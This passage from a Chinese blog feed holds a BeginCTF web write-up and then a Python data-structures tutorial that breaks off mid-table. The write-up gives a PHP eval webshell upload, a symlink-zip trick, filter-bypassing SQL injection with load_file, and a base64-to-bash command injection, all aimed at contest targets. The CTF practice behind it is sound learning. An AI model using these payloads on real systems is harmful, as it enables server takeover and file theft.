class="line">    &#125;</span><br><span class="line">    <span class="keyword">die</span>(<span class="keyword">include</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;action&#x27;</span>]));</span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="variable">$_SERVER</span>[<span class="string">&#x27;REQUEST_METHOD&#x27;</span>] == <span class="string">&#x27;POST&#x27;</span>) &#123;</span><br><span class="line">    <span class="variable">$file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">    <span class="variable">$file_name</span> = <span class="variable">$file</span>[<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line">    <span class="variable">$file_tmp</span> = <span class="variable">$file</span>[<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">    <span class="variable">$file_size</span> = <span class="variable">$file</span>[<span class="string">&#x27;size&#x27;</span>];</span><br><span class="line">    <span class="variable">$file_error</span> = <span class="variable">$file</span>[<span class="string">&#x27;error&#x27;</span>];</span><br><span class="line">    </span><br><span class="line">    <span class="variable">$file_ext</span> = <span class="title function_ invoke__">explode</span>(<span class="string">&#x27;.&#x27;</span>, <span class="variable">$file_name</span>);</span><br><span class="line">    <span class="variable">$file_ext</span> = <span class="title function_ invoke__">strtolower</span>(<span class="title function_ invoke__">end</span>(<span class="variable">$file_ext</span>));</span><br><span class="line">    </span><br><span class="line">    <span class="variable">$allowed</span> = <span class="keyword">array</span>(<span class="string">&#x27;zip&#x27;</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">in_array</span>(<span class="variable">$file_ext</span>, <span class="variable">$allowed</span>) &amp;&amp; (<span class="keyword">new</span> <span class="title class_">ZipArchive</span>())-&gt;<span class="title function_ invoke__">open</span>(<span class="variable">$file_tmp</span>) === <span class="literal">true</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$file_error</span> === <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="variable">$file_size</span> &lt;= <span class="number">2097152</span>) &#123;</span><br><span class="line">                <span class="variable">$file_destination</span> = <span class="string">&#x27;uploads/&#x27;</span> . <span class="variable">$file_name</span>;</span><br><span class="line">    </span><br><span class="line">                <span class="keyword">if</span> (<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$file_tmp</span>, <span class="variable">$file_destination</span>)) &#123;</span><br><span class="line">                    <span class="keyword">echo</span> <span class="title function_ invoke__">json_encode</span>(<span class="keyword">array</span>(</span><br><span class="line">                        <span class="string">&#x27;status&#x27;</span> =&gt; <span class="string">&#x27;ok&#x27;</span>,</span><br><span class="line">                        <span class="string">&#x27;message&#x27;</span> =&gt; <span class="string">&#x27;File uploaded successfully&#x27;</span>,</span><br><span class="line">                        <span class="string">&#x27;url&#x27;</span> =&gt; <span class="title function_ invoke__">preg_split</span>(<span class="string">&#x27;/\?/&#x27;</span>, <span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_REFERER&#x27;</span>])[<span class="number">0</span>] . <span class="variable">$file_destination</span></span><br><span class="line">                    ));</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="title function_ invoke__">json_encode</span>(<span class="keyword">array</span>(</span><br><span class="line">            <span class="string">&#x27;status&#x27;</span> =&gt; <span class="string">&#x27;error&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;message&#x27;</span> =&gt; <span class="string">&#x27;Only zip files are allowed&#x27;</span></span><br><span class="line">        ));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>验证文件名最后一个<code>.</code>后的后缀名是否为zip, 增加了zip文件的有效性验证,并将file_get_contents改为include函数</p><p>只需要将恶意php文件压缩为zip,然后直接包含zip文件即可</p><p>include会将zip文件解析为php</p><p>poc:</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240131225145500.png" alt="image-20240131225145500"></p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240131225218914.png" alt="image-20240131225218914"></p><h2 id="zupload-pro-plus-max-ultra"><a href="#zupload-pro-plus-max-ultra" class="headerlink" title="zupload-pro-plus-max-ultra"></a>zupload-pro-plus-max-ultra</h2><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240201153444529.png" alt="image-20240201153444529"></p><h2 id="zupload-pro-plus-max-ultra-premium"><a href="#zupload-pro-plus-max-ultra-premium" class="headerlink" title="zupload-pro-plus-max-ultra-premium"></a>zupload-pro-plus-max-ultra-premium</h2><p>传软链接的压缩包</p><p>参考:<a href="https://exp10it.io/2023/05/2023-ciscn-%E5%88%9D%E8%B5%9B-web-writeup/">https://exp10it.io/2023/05/2023-ciscn-%E5%88%9D%E8%B5%9B-web-writeup/</a></p><p>这里试了好几次传完软链接再传shell没成功,php不能被解析只能file_get_contents把php的内容带出来</p><p>实际上根本没必要rce阿,由于知道flag就在&#x2F;flag,直接传个软链接链接到根目录就可以了</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">ln</span> -s / abc </span><br><span class="line">zip -y abc.zip abc</span><br></pre></td></tr></table></figure><p>之后传入abc.zip,直接访问&#x2F;uploads&#x2F;abc&#x2F;flag即可将flag下载下来</p><h2 id="zupload-pro-revenge"><a href="#zupload-pro-revenge" class="headerlink" title="zupload-pro-revenge"></a>zupload-pro-revenge</h2><p>额额 边简单了</p><p>直接绕过前端对.zip的限制就可以传入php文件</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>101.32.220.189:31393</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:122.0) Gecko/20100101 Firefox/122.0</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>*/*</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Referer</span><span class="punctuation">: </span>http://101.32.220.189:31393/?action=upload</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>multipart/form-data; boundary=---------------------------18159431502352910098131068589</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>282</span><br><span class="line"><span class="attribute">Origin</span><span class="punctuation">: </span>http://101.32.220.189:31393</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"></span><br><span class="line"><span class="language-php">-----------------------------<span class="number">18159431502352910098131068589</span></span></span><br><span class="line"><span class="language-php">Content-Disposition: form-data; name=<span class="string">&quot;file&quot;</span>; filename=<span class="string">&quot;shell.php&quot;</span></span></span><br><span class="line"><span class="language-php">Content-Type: application/x-zip-compressed</span></span><br><span class="line"><span class="language-php"></span></span><br><span class="line"><span class="language-php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="language-php">@<span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;nacl&#x27;</span>]);</span></span><br><span class="line"><span class="language-php"><span class="meta">?&gt;</span></span></span><br><span class="line"><span class="language-php">-----------------------------<span class="number">18159431502352910098131068589</span>--</span></span><br><span class="line"><span class="language-php"></span></span><br></pre></td></tr></table></figure><p>蚁剑连接cat &#x2F;flag</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240205145106152.png" alt="image-20240205145106152"></p><h2 id="zupload-pro-plus-enhanced"><a href="#zupload-pro-plus-enhanced" class="headerlink" title="zupload-pro-plus-enhanced"></a>zupload-pro-plus-enhanced</h2><p>依然是构造.zip.php</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>101.32.220.189:32767</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:122.0) Gecko/20100101 Firefox/122.0</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>*/*</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Referer</span><span class="punctuation">: </span>http://101.32.220.189:32767/?action=upload</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>multipart/form-data; boundary=---------------------------143906178423789204102969238846</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>276</span><br><span class="line"><span class="attribute">Origin</span><span class="punctuation">: </span>http://101.32.220.189:32767</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"></span><br><span class="line"><span class="language-php">-----------------------------<span class="number">143906178423789204102969238846</span></span></span><br><span class="line"><span class="language-php">Content-Disposition: form-data; name=<span class="string">&quot;file&quot;</span>; filename=<span class="string">&quot;shell.zip.php&quot;</span></span></span><br><span class="line"><span class="language-php">Content-Type: application/x-zip-compressed</span></span><br><span class="line"><span class="language-php"></span></span><br><span class="line"><span class="language-php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="language-php">@<span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;nacl&#x27;</span>]);</span></span><br><span class="line"><span class="language-php"><span class="meta">?&gt;</span></span></span><br><span class="line"><span class="language-php">-----------------------------<span class="number">143906178423789204102969238846</span>--</span></span><br><span class="line"><span class="language-php"></span></span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240205145735598.png" alt="image-20240205145735598"></p><h2 id="sql教学局"><a href="#sql教学局" class="headerlink" title="sql教学局"></a>sql教学局</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?user=&#x27;union/**/seselectlect/**/group_concat(flag)/**/ffromrom/**/secret.passwoorrd%23</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?user=&#x27;union/**/seselectlect/**/group_concat(grade)ffromrom/**/ctf.scoorre/**/where/**/student/**/like/**/&#x27;begin&#x27;%23</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?user=&#x27;union/**/seselectlect/**/lloadoad_file(&#x27;/flag&#x27;)%23</span><br></pre></td></tr></table></figure><p>这里又想去rce看&#x2F;flag了,,,,,,,</p><p>忘记了load_file()</p><h2 id="readbooks-未解出"><a href="#readbooks-未解出" class="headerlink" title="readbooks(未解出)"></a>readbooks(未解出)</h2><p>虽然未找到flag但是payload是一点没问题()</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/list/a||ec&#x27;&#x27;ho$&#123;IFS&#125;&#x27;Y2F0IC9fZmxhZw&#x27;|bas&#x27;&#x27;e64$&#123;IFS&#125;-d|ba&#x27;&#x27;sh</span><br></pre></td></tr></table></figure><p>这里已经rce了,但是里面没找到(感觉真的没有)flag,,,,</p><h2 id="pickelshop-未解出"><a href="#pickelshop-未解出" class="headerlink" title="pickelshop(未解出)"></a>pickelshop(未解出)</h2><p>拿到注册返回的cookie可以登录</p><p>感觉要解码,,不太会</p><h2 id="king-未解出"><a href="#king-未解出" class="headerlink" title="king(未解出)"></a>king(未解出)</h2><p>抓包了web Socket的流量, 看了MongoDB语法, 还是不知道怎么注入,,,</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;BeginCTF（自由赛道）&quot;&gt;&lt;a href=&quot;#BeginCTF（自由赛道）&quot; class=&quot;headerlink&quot; title=&quot;BeginCTF（自由赛道）&quot;&gt;&lt;/a&gt;BeginCTF（自由赛道）&lt;/h1&gt;&lt;h2 id=&quot;POPgadget&quot;&gt;&lt;a hre</summary>
      
    
    
    
    
    <category term="nosql注入" scheme="http://example.com/tags/nosql%E6%B3%A8%E5%85%A5/"/>
    
    <category term="文件上传" scheme="http://example.com/tags/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/"/>
    
    <category term="sql注入" scheme="http://example.com/tags/sql%E6%B3%A8%E5%85%A5/"/>
    
    <category term="命令注入" scheme="http://example.com/tags/%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5/"/>
    
  </entry>
  
  <entry>
    <title>python基础</title>
    <link href="http://example.com/2024/01/29/python%E5%9F%BA%E7%A1%80/"/>
    <id>http://example.com/2024/01/29/python%E5%9F%BA%E7%A1%80/</id>
    <published>2024-01-29T03:05:15.000Z</published>
    <updated>2024-01-29T15:40:47.899Z</updated>
    
    <content type="html"><![CDATA[<h1 id="python基础"><a href="#python基础" class="headerlink" title="python基础"></a>python基础</h1><p>之间也学过一些python编程基础,但大都是零散碎片化的知识</p><p>故在此系统地记录一下python的基本语法以及常见的操作</p><h2 id="基础语法"><a href="#基础语法" class="headerlink" title="基础语法"></a>基础语法</h2><p>首先是一些基础语法,如 赋值, 四则运算, 选择分支, 循环, 嵌套</p><p>由于与其他语言大部分都重复, 这里只写一个简单的示例程序来演示这些基本操作</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> year <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1000</span>, <span class="number">2025</span>):</span><br><span class="line">    <span class="keyword">if</span> year % <span class="number">4</span> == <span class="number">0</span> <span class="keyword">and</span> year % <span class="number">100</span> != <span class="number">0</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;year&#125;</span> 年是闰年&quot;</span>)</span><br><span class="line">    <span class="keyword">elif</span> year % <span class="number">400</span> == <span class="number">0</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;year&#125;</span> 年是闰年&quot;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;year&#125;</span> 年不是闰年&quot;</span>)</span><br></pre></td></tr></table></figure><p>运行结果显而易见</p><p>特别的,python中有<code>/</code>和<code>//</code>两种除法</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">print</span>(<span class="number">1</span> / <span class="number">3</span>)<span class="comment">#0.3333333333333333</span></span><br><span class="line"><span class="built_in">print</span>(<span class="number">1</span> / <span class="number">3</span>)<span class="comment">#-0.3333333333333333</span></span><br><span class="line"><span class="built_in">print</span>(<span class="number">1</span> // <span class="number">3</span>)<span class="comment">#0</span></span><br><span class="line"><span class="built_in">print</span>(-<span class="number">1</span> // <span class="number">3</span>)<span class="comment">#-1</span></span><br></pre></td></tr></table></figure><p>显然, <code>/</code>执行了浮点运算,而<code>//</code>则是__向下取整__</p><h2 id="列表-List"><a href="#列表-List" class="headerlink" title="列表(List)"></a>列表(List)</h2><p>举例:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">list1 = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="string">&#x27;nacl&#x27;</span>, <span class="string">&#x27;kcl&#x27;</span>, <span class="string">&#x27;hcl&#x27;</span>]</span><br></pre></td></tr></table></figure><p>有以下几种切片方式</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">list1 = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="string">&#x27;nacl&#x27;</span>, <span class="string">&#x27;kcl&#x27;</span>, <span class="string">&#x27;hcl&#x27;</span>]</span><br><span class="line"><span class="built_in">print</span>(list1[<span class="number">0</span>])</span><br><span class="line"><span class="built_in">print</span>(list1[<span class="number">1</span>:])    <span class="comment"># 打印索引为1元素后的所有元素(包含索引为1的元素) </span></span><br><span class="line"><span class="built_in">print</span>(list1[<span class="number">1</span>:<span class="number">5</span>])   <span class="comment"># 左闭右开</span></span><br><span class="line"><span class="built_in">print</span>(list1[:<span class="number">5</span>])    <span class="comment"># 打印索引为5元素前的所有元素(不包含索引为5的元素)</span></span><br><span class="line"><span class="built_in">print</span>(list1[-<span class="number">1</span>])    <span class="comment"># 最后一个元素的索引为-1,以此类推</span></span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">1</span><br><span class="line">[2, 3, &#x27;nacl&#x27;, &#x27;kcl&#x27;, &#x27;hcl&#x27;]</span><br><span class="line">[2, 3, &#x27;nacl&#x27;, &#x27;kcl&#x27;]</span><br><span class="line">[1, 2, 3, &#x27;nacl&#x27;, &#x27;kcl&#x27;]</span><br><span class="line">hcl</span><br></pre></td></tr></table></figure><h3 id="列表操作"><a href="#列表操作" class="headerlink" title="列表操作"></a>列表操作</h3><h4 id="更新列表"><a href="#更新列表" class="headerlink" title="更新列表"></a>更新列表</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">list1 = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>]</span><br><span class="line">list1.append(<span class="string">&#x27;cabbage&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(list1)</span><br><span class="line"><span class="comment">#输出: [1, 2, 3, &#x27;cabbage&#x27;]</span></span><br></pre></td></tr></table></figure><h4 id="删除列表元素"><a href="#删除列表元素" class="headerlink" title="删除列表元素"></a>删除列表元素</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">list1 = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="string">&#x27;cabbage&#x27;</span>]</span><br><span class="line"><span class="keyword">del</span> list1[-<span class="number">1</span>]</span><br><span class="line"><span class="built_in">print</span>(list1)</span><br><span class="line"><span class="comment">#输出: [1, 2, 3]</span></span><br></pre></td></tr></table></figure><h4 id="列表操作符"><a href="#列表操作符" class="headerlink" title="列表操作符"></a>列表操作符</h4><p>常用的就是<code>+</code>拼接,<code>in</code>判断某元素是否在列表中, 这里搬运一下菜鸟教程上的一个表格</p><table><thead><tr><th align="left">Python 表达式</th><th align="left">结果</th><th align="left">描述</th></tr></thead><tbody><tr><td align="left">len([1, 2, 3])</td><td align="left">3</td><td align="left">长度</td></tr><tr><td align="left">[1, 2, 3] + [4, 5, 6]</td><td align="left">[1, 2, 3, 4, 5, 6]</td><td align="left">组合</td></tr><tr><td align="left">[‘Hi!’] * 4</td><td align="left">[‘Hi!’, ‘Hi!’, ‘Hi!’, ‘Hi!’]</td><td align="left">重复</td></tr><tr><td align="left">3 in [1, 2, 3]</td><td align="left">True</td><td align="left">元素是否存在于列表中</td></tr><tr><td align="left">for x in [1, 2, 3]: print(x, end&#x3D;” “)</td><td align="left">1 2 3</td><td align="left">迭代</td></tr></tbody></table><h4 id="列表嵌套"><a href="#列表嵌套" class="headerlink" title="列表嵌套"></a>列表嵌套</h4><p>列表是可以嵌套存在的, 即列表中的元素也可以是列表</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">list1 = [<span class="number">1</span>, [<span class="string">&#x27;nacl&#x27;</span>, <span class="string">&#x27;cabbage&#x27;</span>], <span class="number">3</span>]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> list1:</span><br><span class="line">    <span class="built_in">print</span>(i)</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1</span><br><span class="line">[&#x27;nacl&#x27;, &#x27;cabbage&#x27;]</span><br><span class="line">3</span><br></pre></td></tr></table></figure><p>这里的第二个元素(索引为1)就被声明成了一个有两个元素的列表</p><p>__更多列表相关的函数与方法:__<a href="https://www.runoob.com/python3/python3-list.html">https://www.runoob.com/python3/python3-list.html</a></p><h2 id="元组-tuple"><a href="#元组-tuple" class="headerlink" title="元组(tuple)"></a>元组(tuple)</h2><p>与list相似, 元组是一些元素的集合, 但是元组不可修改</p><p>元组中只包含一个元素时，需要在元素后面添加逗号</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tup1 = (<span class="number">50</span>,)</span><br></pre></td></tr></table></figure><p>元组的访问方式与list相同, 即都是使用<code>[]</code>并加上索引来访问</p><h3 id="无关闭分隔符"><a href="#无关闭分隔符" class="headerlink" title="无关闭分隔符"></a>无关闭分隔符</h3><p>任意无符号的对象，以逗号隔开，默认为元组</p><p>…说实话没太理解,它给出了一个例子</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"> </span><br><span class="line"><span class="built_in">print</span> <span class="string">&#x27;abc&#x27;</span>, -<span class="number">4.24e93</span>, <span class="number">18</span>+<span class="number">6.6j</span>, <span class="string">&#x27;xyz&#x27;</span></span><br><span class="line">x, y = <span class="number">1</span>, <span class="number">2</span></span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;Value of x , y : &quot;</span>, x,y</span><br></pre></td></tr></table></figure><p>以上实例运行结果：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">abc -4.24e+93 (18+6.6j) xyz</span><br><span class="line">Value of x , y : 1 2</span><br></pre></td></tr></table></figure><h3 id="元组内置函数"><a href="#元组内置函数" class="headerlink" title="元组内置函数"></a>元组内置函数</h3><table><thead><tr><th align="left">序号</th><th align="left">方法及描述</th></tr></thead><tbody><tr><td align="left">1</td><td align="left"><a href="https://www.runoob.com/python/att-tuple-cmp.html">cmp(tuple1, tuple2)</a> 比较两个元组元素。</td></tr><tr><td align="left">2</td><td align="left"><a href="https://www.runoob.com/python/att-tuple-len.html">len(tuple)</a> 计算元组元素个数。</td></tr><tr><td align="left">3</td><td align="left"><a href="https://www.runoob.com/python/att-tuple-max.html">max(tuple)</a> 返回元组中元素最大值。</td></tr><tr><td align="left">4</td><td align="left"><a href="https://www.runoob.com/python/att-tuple-min.html">min(tuple)</a> 返回元组中元素最小值。</td></tr><tr><td align="left">5</td><td align="left"><a href="https://www.runoob.com/python/att-tuple-tuple.html">tuple(seq)</a> 将列表转换为元组。</td></tr></tbody></table><h2 id="字典-Dictionary"><a href="#字典-Dictionary" class="headerlink" title="字典(Dictionary)"></a>字典(Dictionary)</h2><p>字典采用键值对的方式来存储任意类型的对象</p><p>举例:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">dic = &#123;<span class="string">&#x27;alice&#x27;</span>: <span class="string">&#x27;12345&#x27;</span>, <span class="string">&#x27;mike&#x27;</span>: <span class="string">&#x27;43210&#x27;</span>, <span class="string">&#x27;bob&#x27;</span>: <span class="string">&#x27;114514&#x27;</span>, <span class="string">&#x27;default&#x27;</span>: <span class="number">0</span>&#125;</span><br><span class="line"><span class="built_in">print</span>(dic[<span class="string">&#x27;alice&#x27;</span>])</span><br><span class="line"><span class="comment"># 输出: 12345</span></span><br></pre></td></tr></table></figure><p>仍然采用<code>[]</code>来访问,只不过索引为要访问元素的键名</p><h3 id="修改字典"><a href="#修改字典" class="headerlink" title="修改字典"></a>修改字典</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">tinydict[<span class="string">&#x27;Age&#x27;</span>] = <span class="number">8</span> <span class="comment"># 更新</span></span><br><span class="line">tinydict[<span class="string">&#x27;School&#x27;</span>] = <span class="string">&quot;RUNOOB&quot;</span> <span class="comment"># 添加</span></span><br><span class="line"><span class="keyword">del</span> tinydict[<span class="string">&#x27;Name&#x27;</span>]  <span class="comment"># 删除键是&#x27;Name&#x27;的条目</span></span><br><span class="line">tinydict.clear()      <span class="comment"># 清空字典所有条目</span></span><br><span class="line"><span class="keyword">del</span> tinydict          <span class="comment"># 删除字典</span></span><br></pre></td></tr></table></figure><h3 id="字典特性"><a href="#字典特性" class="headerlink" title="字典特性"></a>字典特性</h3><p>字典值可以是任何的 python 对象，既可以是标准的对象，也可以是用户定义的，但键不行</p><p>1）不允许同一个键出现两次。创建时如果同一个键被赋值两次，后一个值会被记住</p><p>2）键必须不可变，所以可以用数字，字符串或元组充当，而用列表就不行</p><p>更多: </p><p><a href="https://www.runoob.com/python3/python3-dictionary.html">https://www.runoob.com/python3/python3-dictionary.html</a></p><h2 id="集合-set"><a href="#集合-set" class="headerlink" title="集合(set)"></a>集合(set)</h2><p>示例:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">words = &#123;<span class="string">&#x27;hello&#x27;</span>, <span class="string">&#x27;world&#x27;</span>, <span class="string">&#x27;cabbage&#x27;</span>&#125;</span><br><span class="line">words.add(<span class="string">&#x27;rabbit&#x27;</span>)<span class="comment">#添加</span></span><br><span class="line">words.update([<span class="string">&#x27;a&#x27;</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>])  <span class="comment">#参数可以是列表，元组，字典等，语法格式如下</span></span><br><span class="line">words.remove(<span class="string">&#x27;cabbage&#x27;</span>)<span class="comment">#删除</span></span><br><span class="line">s.discard(<span class="string">&#x27;cat&#x27;</span>)<span class="comment">#此方法删除元素时如果元素不存在，不会发生错误</span></span><br><span class="line"><span class="built_in">print</span>(words)</span><br><span class="line">输出:&#123;<span class="string">&#x27;a&#x27;</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="string">&#x27;rabbit&#x27;</span>, <span class="string">&#x27;world&#x27;</span>, <span class="string">&#x27;hello&#x27;</span>&#125;</span><br></pre></td></tr></table></figure><table><thead><tr><th align="left">方法</th><th align="left">描述</th></tr></thead><tbody><tr><td align="left"><a href="https://www.runoob.com/python3/ref-set-add.html">add()</a></td><td align="left">为集合添加元素</td></tr><tr><td align="left"><a href="https://www.runoob.com/python3/ref-set-clear.html">clear()</a></td><td align="left">移除集合中的所有元素</td></tr><tr><td align="left"><a href="https://www.runoob.com/python3/ref-set-copy.html">copy()</a></td><td align="left">拷贝一个集合</td></tr><tr><td align="left"><a href="https://www.runoob.com/python3/ref-set-difference.html">difference()</a></td><td align="left">返回多个集合的差集</td></tr><tr><td align="left"><a href="https://www.runoob.com/python3/ref-set-difference_update.html">difference_update()</a></td><td align="left">移除集合中的元素，该元素在指定的集合也存在。</td></tr><tr><td align="left"><a href="https://www.runoob.com/python3/ref-set-discard.html">discard()</a></td><td align="left">删除集合中指定的元素</td></tr><tr><td align="left"><a href="https://www.runoob.com/python3/ref-set-intersection.html">intersection()</a></td><td align="left">返回集合的交集</td></tr><tr><td align="left"><a href="https://www.runoob.com/python3/ref-set-intersection_update.html">intersection_update()</a></td><td 